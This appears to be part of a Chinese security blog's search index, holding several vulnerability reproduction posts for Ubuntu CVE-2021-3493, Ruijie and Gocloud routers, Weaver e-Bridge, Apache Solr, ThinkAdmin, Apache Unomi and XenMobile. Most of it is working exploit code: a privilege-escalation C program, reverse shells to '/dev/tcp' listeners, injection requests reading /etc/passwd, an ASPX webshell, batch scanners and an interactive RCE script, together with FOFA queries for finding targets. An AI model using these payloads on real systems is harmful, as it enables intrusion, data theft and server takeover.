DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, &quot;unshare&quot;); xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;); sprintf(buf, &quot;0 %d 1&quot;, uid); xwritefile(&quot;/proc/self/uid_map&quot;, buf); sprintf(buf, &quot;0 %d 1&quot;, gid); xwritefile(&quot;/proc/self/gid_map&quot;, buf); sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1) err(1, &quot;mount %s&quot;, DIR_MERGE); // all+ep char cap[] = &quot;\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00&quot;; xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777); if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1) err(1, &quot;setxattr %s&quot;, BIN_MERGE); return 0;&#125;int main(int argc, char *argv[])&#123; if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123; setuid(0); setgid(0); execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL); err(1, &quot;execl /bin/bash&quot;); &#125; pid_t child = fork(); if (child == -1) err(1, &quot;fork&quot;); if (child == 0) &#123; _exit(exploit()); &#125; else &#123; waitpid(child, NULL, 0); &#125; execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL); err(1, &quot;execl %s&quot;, BIN_UPPER);&#125; 漏洞利用 123gcc exploit.c -o exploitchmod +x exploit.&#x2F;exploit # 普通可登录用户测试 # www 不可登录用户测试 为了方便测试我直接使用了宝塔搭建了 web 环境，模拟当我们拿到 www 权限时提权过程 假如你通过某种方式上传了木马文件，可以使用蚁剑连接，将 exp 文件放在一个可读写的目录下，即权限为 777 因为蚁剑的虚拟终端只是 webshell，并非我们所需的 shell，所以我们可以先反弹一个 bash 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.30.5&#x2F;3344 0&gt;&amp;1 kali 监听，然后使用 Ubuntu 反弹 shell www 提权测试 123gcc exploit.c -o exploitchmod +x exploit.&#x2F;exploit 尝试使用了阿里云的服务器测试，测试失败，因为内核已经升级 # 防御建议 更新系统内核版本。详细版本信息请参考供应商的安全公告。","path":"2021/04/23/CVE-2021-3493-Ubuntu提权/","date":"04-23","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"提权","slug":"提权","permalink":"https://spaceman-911.gitee.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"CNVD-2021-09650 锐捷NBR路由器 EWEB网管系统 远程命令执行","text":"# CNVD-2021-09650 锐捷 NBR 路由器 EWEB 网管系统 远程命令执行 # 漏洞简介 锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等网络设备产品及解决方案的专业化网络厂商。 锐捷网络 EWEB 网管系统存在远程命令执行漏洞。 # 影响版本 锐捷 NBR 路由器 EWEB 网管系统 版本 &lt; 2018 可能 # 资产收集 FOFA： 123title&#x3D;&quot;锐捷网络-EWEB网管系统&quot;icon_hash&#x3D;&quot;-692947551&quot; # 漏洞复现 post 传输 123&#x2F;guest_auth&#x2F;guestIsUp.phpmac&#x3D;1&amp;ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt; 566.txt 查看 passwd 写入 566.txt 中 访问 566.txt 这个权限是 root 权限 # 漏洞分析 漏洞的文件在 /guest_auth/guestIsUp.php 12345678910111213141516&lt;?php //查询用户是否上线了 $userip = @$_POST[&#x27;ip&#x27;]; $usermac = @$_POST[&#x27;mac&#x27;]; if (!$userip || !$usermac) &#123; exit; &#125; /* 判断该用户是否已经放行 */ $cmd = &#x27;/sbin/app_auth_hook.elf -f &#x27; . $userip; $res = exec($cmd, $out, $status); /* 如果已经上线成功 */ if (strstr($out[0], &quot;status:1&quot;)) &#123; echo &#x27;true&#x27;; &#125;?&gt; 这里没有任何过滤，直接将添加 ip 然后执行 exec，可直接命令拼接注入，从而形成远程命令执行","path":"2021/03/31/CNVD-2021-09650-锐捷NBR路由器-EWEB网管系统-远程命令执行/","date":"03-31","excerpt":"","tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CNVD","slug":"CNVD","permalink":"https://spaceman-911.gitee.io/tags/CNVD/"}]},{"title":"泛微云桥-任意文件读取","text":"# 泛微云桥 - 任意文件读取 # 漏洞简介 泛微云桥（e-Bridge）是上海泛微公司在” 互联网 +” 的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 # 影响版本 2018-2019 多个版本 # 资产查找 FOFA： 1&quot;泛微云桥&quot; # 漏洞复现 windows 为例 例如想读取 C:/Windows/win.ini 文件 访问 /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt 获取文件 id 读取文件 /file/fileNoLogin/上面获取到的id 当然可以进行目录读取，我们只需将 downloadUrl 参数更换为绝对路径目录即可 /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/&amp;fileExt=txt 目录读取： /file/fileNoLogin/cb25f92f19954e99903c610d96c6b7fa 自写垃圾检测 1234567891011121314151617181920212223242526272829import requestsimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)requests.packages.urllib3.disable_warnings()def run(url): w_poc1 = &#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///C:/Windows/win.ini&amp;fileExt=txt&#x27; try: r = requests.get(url+w_poc1,verify=False,timeout=5) except Exception as e: print (url,&#x27; 无法连接&#x27;) return 0 if &#x27;msg&#x27; in r.text: r = requests.get(url+w_poc1,verify=False,timeout=5).json()[&quot;msg&quot;] if r == &#x27;无法验证您的身份！&#x27;: print (url,&#x27; 安全&#x27;) elif &#x27;语法不正确&#x27; in r: l_poc1 = &#x27;/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt&#x27; r = requests.get(url+l_poc1,verify=False,timeout=6).json()[&quot;id&quot;] if r != &#x27;&#x27;: print (url,&#x27; 系统为linux 存在漏洞！！！！！&#x27;) elif &#x27;id&#x27; in r.text: print (url,&#x27; 系统为windows 存在漏洞！！！！！&#x27;) else: print (url,&#x27; 未知错误&#x27;)# ip后面的斜杠不要，正确ip:http://127.0.0.1url = input(&#x27;Url &gt;&gt;&gt; &#x27;)run(url) 批量检测，不知道是没有找到原因，还是我脚本写的不对的原因，没有找到 linux 系统的 # 修复建议 0x01 关闭程序路由 /file/fileNoLogin 0x02 升级版本","path":"2021/03/28/泛微云桥-任意文件读取/","date":"03-28","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"Apache Solr 任意文件读取漏洞","text":"# Apache Solr 任意文件读取漏洞 # 漏洞简介 Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。 # 影响版本 全版本（&gt;=8.8） # 资产查找 FOFA： 1app&#x3D;&quot;Solr&quot; # 漏洞复现 访问： /solr/admin/cores?indexInfo=false&amp;wt=json 再发送 post 请求 /solr/ 之后填写的是刚刚我们上面获取到的 status name 1234567891011POST &#x2F;solr&#x2F;panda_goods&#x2F;config HTTP&#x2F;1.1Host: ip:8983User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 82&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125; 出现 &quot;This response format is experimental. It is likely to change in the future.&quot; 表示存在漏洞 最后可以进行文件读取了 123456789101112POST &#x2F;solr&#x2F;panda_goods&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: ip:8983User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko&#x2F;20100101 Firefox&#x2F;87.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 29Content-Type: application&#x2F;x-www-form-urlencodedstream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd poc（by peiqi） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport sysimport randomimport reimport base64import timefrom lxml import etreeimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarningdef title(): print(&#x27;+------------------------------------------&#x27;) print(&#x27;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m&#x27;) print(&#x27;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m&#x27;) print(&#x27;+ \\033[34m公众号 : PeiQi文库 \\033[0m&#x27;) print(&#x27;+ \\033[34mVersion: Apache Solr &lt; 8.2.0 \\033[0m&#x27;) print(&#x27;+ \\033[36m使用格式: python3 CVE-2019-0193.py \\033[0m&#x27;) print(&#x27;+ \\033[36mUrl &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983 \\033[0m&#x27;) print(&#x27;+ \\033[36mFile &gt;&gt;&gt; 文件名称或目录 \\033[0m&#x27;) print(&#x27;+------------------------------------------&#x27;)def POC_1(target_url): core_url = target_url + &quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot; try: response = requests.request(&quot;GET&quot;, url=core_url, timeout=10) core_name = list(json.loads(response.text)[&quot;status&quot;])[0] print(&quot;\\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;/solr/&quot; + core_name + &quot;/config\\033[0m&quot;) return core_name except: print(&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;) sys.exit(0)def POC_2(target_url, core_name): vuln_url = target_url + &quot;/solr/&quot; + core_name + &quot;/config&quot; headers = &#123; &quot;Content-type&quot;:&quot;application/json&quot; &#125; data = &#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27; try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(&quot;\\033[36m[o] 正在准备文件读取...... \\033[0m&quot;.format(target_url)) if &quot;This&quot; in response.text and response.status_code == 200: print(&quot;\\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \\033[0m&quot;.format(target_url)) else: print(&quot;\\033[31m[x] 目标 &#123;&#125; 不存在漏洞\\033[0m&quot;.format(target_url)) sys.exit(0) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)def POC_3(target_url, core_name, File_name): vuln_url = target_url + &quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;.format(core_name) headers = &#123; &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; &#125; data = &#x27;stream.url=file://&#123;&#125;&#x27;.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if &quot;No such file or directory&quot; in response.text: print(&quot;\\033[31m[x] 读取&#123;&#125;失败 \\033[0m&quot;.format(File_name)) else: print(&quot;\\033[36m[o] 响应为:\\n&#123;&#125; \\033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;])) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)if __name__ == &#x27;__main__&#x27;: title() target_url = str(input(&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;)) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(&quot;\\033[35mFile &gt;&gt;&gt; \\033[0m&quot;)) POC_3(target_url, core_name, File_name) 批量，将 url 写入 1.txt 文件，存在漏洞则自动存入 url.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import requestsimport sysimport randomimport reimport base64import timefrom lxml import etreeimport jsonfrom requests.packages.urllib3.exceptions import InsecureRequestWarninga=[]def title(): print(&#x27;+------------------------------------------&#x27;) print(&#x27;+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m&#x27;) print(&#x27;+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m&#x27;) print(&#x27;+ \\033[34m公众号 : PeiQi文库 \\033[0m&#x27;) print(&#x27;+ \\033[34mVersion: Apache Solr &lt; 8.2.0 \\033[0m&#x27;) print(&#x27;+ \\033[36m使用格式: python3 poc.py \\033[0m&#x27;) print(&#x27;+ \\033[36mUrl &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983 \\033[0m&#x27;) print(&#x27;+ \\033[36mFile &gt;&gt;&gt; 文件名称或目录 \\033[0m&#x27;) print(&#x27;+------------------------------------------&#x27;)def POC_1(target_url): core_url = target_url + &quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot; try: response = requests.request(&quot;GET&quot;, url=core_url, timeout=2) core_name = list(json.loads(response.text)[&quot;status&quot;])[0] print(&quot;\\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;/solr/&quot; + core_name + &quot;/config\\033[0m&quot;) return core_name except: print(&quot;\\033[31m[x] 目标Url漏洞利用失败\\033[0m&quot;) return 1def POC_2(target_url, core_name): vuln_url = target_url + &quot;/solr/&quot; + core_name + &quot;/config&quot; headers = &#123; &quot;Content-type&quot;:&quot;application/json&quot; &#125; data = &#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27; try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(&quot;\\033[36m[o] 正在准备文件读取...... \\033[0m&quot;.format(target_url)) if &quot;This&quot; in response.text and response.status_code == 200: print(&quot;\\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \\033[0m&quot;.format(target_url)) else: print(&quot;\\033[31m[x] 目标 &#123;&#125; 不存在漏洞\\033[0m&quot;.format(target_url)) return 1 except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)def POC_3(target_url, core_name, File_name): vuln_url = target_url + &quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;.format(core_name) headers = &#123; &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; &#125; data = &#x27;stream.url=file://&#123;&#125;&#x27;.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if &quot;No such file or directory&quot; in response.text: print(&quot;\\033[31m[x] 读取&#123;&#125;失败 \\033[0m&quot;.format(File_name)) print(response.text) else: if &#x27;root&#x27; in response.text: print(target_url) with open(&#x27;./url.txt&#x27;,&#x27;a&#x27;) as f: f.write(target_url+&#x27;\\n&#x27;) print(&quot;\\033[36m[o] 响应为:\\n&#123;&#125; \\033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;])) except Exception as e: print(&quot;\\033[31m[x] 请求失败 \\033[0m&quot;, e)if __name__ == &#x27;__main__&#x27;: title() with open(&#x27;1.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: g=f.read() a=re.findall(&#x27;\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[.]\\d&#123;1,3&#125;[:]\\d+&#x27;,g) print(a) for i in a: if &#x27;http&#x27; in i: target_url = str(i) else: target_url = &#x27;http://&#x27;+str(i) print(target_url) core_name = POC_1(target_url) print(core_name) if str(core_name)==&#x27;1&#x27;: print(22) continue b=POC_2(target_url, core_name) if str(b)==&#x27;1&#x27;: continue File_name = str(&#x27;/etc/passwd&#x27;) POC_3(target_url, core_name, File_name) # 漏洞修复 由于目前官方不予修复该漏洞，暂无安全版本。 1231. 开启身份验证&#x2F;授权2. 配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问3. 禁止将Apache Solr放置在外网","path":"2021/03/27/Apache-Solr-任意文件读取漏洞/","date":"03-27","excerpt":"","tags":[{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"某媒体资源平台 权限绕过+文件上传 by 月球大师傅","text":"某媒体资源平台 权限绕过+文件上传 by 月球大师傅漏洞简介月球师傅发的某媒体资源平台 0day 资产收集 FOFA： 1&quot;&#x2F;Widget&#x2F;common&#x2F;Service&#x2F;CommonWidgetService.asmx&#x2F;Categorylist&quot; 漏洞复现注册一个用户： http://xxx.xxx.xxx/Module/SSO/SJS_Register.aspx 登录账号，访问：/Module/PersonalCenter/Default.aspx?user=566 垂直权限绕过：/Module/PersonalCenter/Default.aspx?user=admin 跳转至管理员后台界面： /SmartMobile/MobileIndex.aspx?uname=admin&amp;orgId=0 文件上传我没有测试成功，有个啥云waf，感兴趣的师傅可以去F12sec看看：http://www.0dayhack.net/index.php/1278/","path":"2021/03/27/某媒体资源平台-权限绕过-文件上传-by-月球大师傅/","date":"03-27","excerpt":"","tags":[{"name":"权限","slug":"权限","permalink":"https://spaceman-911.gitee.io/tags/%E6%9D%83%E9%99%90/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"CVE-2020-25540 ThinkAdmin任意文件读取","text":"# CVE-2020-25540 ThinkAdmin 任意文件读取 # 漏洞简介 ThinkAdmin 是一套基于 ThinkPHP 框架的通用后台管理系统 ，ThinkAdmin6 版本存在路径遍历漏洞。该漏洞主要是因为 api 中存在危险函数，没有任何过滤。攻击者可利用该漏洞通过请求编码参数任意读取远程服务器上的任意文件。 # 资产收集 FOFA： 1app&#x3D;&quot;ThinkAdmin&quot; # 漏洞复现 Poc 12345678910111213POST &#x2F;admin.html?s&#x3D;admin&#x2F;api.Update&#x2F;node HTTP&#x2F;1.1Host: ipUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko&#x2F;20100101 Firefox&#x2F;86.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: think_lang&#x3D;zh-cn; PHPSESSID&#x3D;ba4d233a6abc8a5a999e9a1d0917634cUpgrade-Insecure-Requests: 1Content-Length: 21Content-Type: application&#x2F;x-www-form-urlencodedrules&#x3D;%5B%22%2F%22%5D 自写的垃圾检测脚本 123456789101112131415import requestsimport urllib3url = input(&quot;url &gt;&gt;&gt; &quot;)try: data = &#123;&quot;rules&quot;:&quot;[\\&quot;/\\&quot;]&quot;&#125; requests.packages.urllib3.disable_warnings() res = requests.post(url+&#x27;/admin.html?s=admin/api.Update/node&#x27;,data=data,verify=False,timeout=6).text if &#x27;/404.html&#x27; in res: print(&#x27;&#123;&#125; 存在漏洞!!!!!&#x27;.format(url)) # print (res) else: print(&#x27;&#123;&#125; 安全!&#x27;.format(url))except: print(&#x27;&#123;&#125; 无法访问!&#x27;.format(url)) 批量检测如下： # 漏洞分析 源码：https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php Update.php 中的函数方法未授权执行，可直接调用，导致漏洞产生 # 漏洞修复 升级版本","path":"2021/03/27/CVE-2020-25540-ThinkAdmin任意文件读取/","date":"03-27","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://spaceman-911.gitee.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"某数字化校园综合管理系统-文件上传getshell","text":"# 某数字化校园综合管理系统 - 文件上传 getshell # 漏洞简介 系统前台企业注册页面存在恶意文件上传漏洞 # 资产查找 FOFA： 1body&#x3D;&quot;DC_Login&#x2F;QYSignUp&quot; # 漏洞复现 点击企业注册 不存在这个链接可直接尝试访问 /DC_Login/QYSignUp 目录 选择上传附件，直接上传 aspx 一句话木马 1&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cmd&quot;],&quot;nice!&quot;);%&gt; 成功上传 蚁剑连接 各位白帽子应严格遵守中华人民共和国相关法律法规 。","path":"2021/03/18/某数字化校园综合管理系统-文件上传getshell/","date":"03-18","excerpt":"","tags":[{"name":"getshell","slug":"getshell","permalink":"https://spaceman-911.gitee.io/tags/getshell/"},{"name":"文件上传","slug":"文件上传","permalink":"https://spaceman-911.gitee.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"CVE-2020-13942 Apache Unomi 远程代码执行漏洞","text":"# CVE-2020-13942 Apache Unomi 远程代码执行漏洞 # 漏洞简介 Apache Unomi 是一个 Java 开源客户数据平台，这是一个 Java 服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi 可用于在非常不同的系统（例如 CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。 在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码，漏洞对应编号为 CVE-2020-11975，而 CVE-2020-13942 漏洞是对 CVE-2020-11975 漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。 # 影响版本 Apache Unomi &lt; 1.5.2 # 资产查找 FOFA： 1title&#x3D;&quot;Apache Unomi Welcome Page&quot; # 漏洞复现 post 数据包 payload，ping dnslog 12345678910111213141516171819202122232425POST /context.json HTTP/1.1Host: ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1If-None-Match: 1611088794279Content-Length: 259&#123; &quot;filters&quot;: [&#123; &quot;id&quot;: &quot;boom&quot;, &quot;filters&quot;: [&#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 3xelvq.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125;] &#125;], &quot;sessionId&quot;: &quot;boom&quot;&#125; 反弹 shell，先去编码一下（http://www.jackson-t.ca/runtime-exec-payloads.html） 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;vps&#x2F;3344 0&gt;&amp;1 替换 exec 内容，vps 监听，发包 成功获取一个 docker shell（直接好家伙） 附上脚本（from 团长） 1234567891011121314151617181920212223242526272829# @author Firbaskyimport requestsimport jsonMVEL_exp = &#123; &quot;filters&quot;: [ &#123; &quot;id&quot;: &quot;sample&quot;, &quot;filters&quot;: [ &#123; &quot;condition&quot;: &#123; &quot;parameterValues&quot;: &#123; &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(&#x27;ping 9309y5.dnslog.cn&#x27;);&quot; &#125;, &quot;type&quot;: &quot;profilePropertyCondition&quot; &#125; &#125; ] &#125; ], &quot;sessionId&quot;: &quot;sample&quot;&#125;url = input(&#x27;Url &gt;&gt;&gt; &#x27;)MVEL_exp = json.dumps(MVEL_exp)headers = &#123;&quot;Content-type&quot;: &quot;application/json&quot;,&quot;Accept&quot;: &quot;*/*&quot;&#125;r = requests.post(url+&quot;/context.json&quot;, data=MVEL_exp, headers=headers,verify=False)print (r.text) # 漏洞修复 升级升级","path":"2021/03/18/CVE-2020-13942-Apache-Unomi-远程代码执行漏洞/","date":"03-18","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8949 Gocloud高恪固件RCE","text":"# CVE-2020-8949 Gocloud 高恪固件 RCE # 漏洞简介 Gocloud 路由器，后台 ping 命令存在命令注入，该路由器常用于企业或者网吧 # 影响版本 GOCLOUD S2A_WL - 固件版本 4.2.7.16471 GOCLOUD S2A - 固件版本 4.2.7.17278 GOCLOUD S2A - 固件版本 4.3.0.15815 GOCLOUD S2A - 固件版本 4.3.0.17193 GOCLOUD S3A（K2P MTK 版本）- 固件版本 4.2.7.16528 GOCLOUD S3A - 固件版本 4.3.0.16572 GOCLOUD ISP3000 英特尔 ® 至强 ®E5-2660 - 固件版本 4.3.0.17190 # 漏洞复现 使用弱口令登录：admin/admin 命令注入存在的地方 bp 抓包可查看请求过程 注入 payload 123&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig%202%3E&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_&#x2F;cgi-bin&#x2F;webui&#x2F;admin&#x2F;tools&#x2F;app_ping&#x2F;diag_ping&#x2F;;ifconfig 2&gt;&amp;1;&#x2F;5&#x2F;6&#x2F;a.com_ 执行的是 ifconfig 命令 附上 exp 脚本（来源网络）： 1234567891011121314151617181920212223242526272829303132333435# -*- coding:utf-8 -*-import requestsimport timefrom urllib.parse import quote# 执行命令EXPdef execute_command(command, TARGET): try: url = TARGET + &quot;/cgi-bin/webui&quot; timestamp = str(time.time()).split(&quot;.&quot;)[0] # 创建session request1 = requests.session() login = &#123;&quot;csrftoken&quot;: &quot;MTU5MzQ5NjI5MEdPQ0xPVUQ=&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;timestamp&quot;: &quot;1593496290&quot;, &quot;username&quot;: &quot;admin&quot;&#125; # 发送登录数据 r = request1.post(url, data=login, verify=False, timeout=10) print(r.status_code) url2 = TARGET + quote(&quot;/cgi-bin/webui/admin/tools/app_ping/diag_ping/ ;&quot; + command + &quot; 2&gt;&amp;1; /5/6/a.com_&quot;) r2 = request1.post(url2, verify=False, timeout=10) print(r2.url) print(r2.text) except Exception as e: print(e)if __name__ == &#x27;__main__&#x27;: command = &#x27;id&#x27; url = input(&quot;Url &gt;&gt;&gt; &quot;) while True: execute_command(command,url) command = input(&quot;~$: &quot;)","path":"2021/03/15/CVE-2020-8949-Gocloud高恪固件RCE/","date":"03-15","excerpt":"","tags":[{"name":"CVE","slug":"CVE","permalink":"https://spaceman-911.gitee.io/tags/CVE/"},{"name":"命令执行","slug":"命令执行","permalink":"https://spaceman-911.gitee.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"CVE-2020-8209 XenMobile-控制台 任意文件读取","text":"# CVE-2020-8209 XenMobile - 控制台 任意文件读取 # 漏洞简介 XenMobile 是 Citrix 开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 Citrix Endpoint Management 存在 任意文件读取漏洞，远程未授权攻击者通过发送特制 HTTP 请求，可以造成读取受影响设备上任意文件的影响。 # 影响版本 XenMobile Server &lt; 10.12 RP2 XenMobile Server &lt; 10.11 RP4 XenMobile Server &lt; 10.10 RP6 XenMobile Server &lt; 10.9 RP5 # 资产查找 FOFA： 1app&#x3D;&quot;XenMobile-控制台&quot; 国外站点较多 payload： 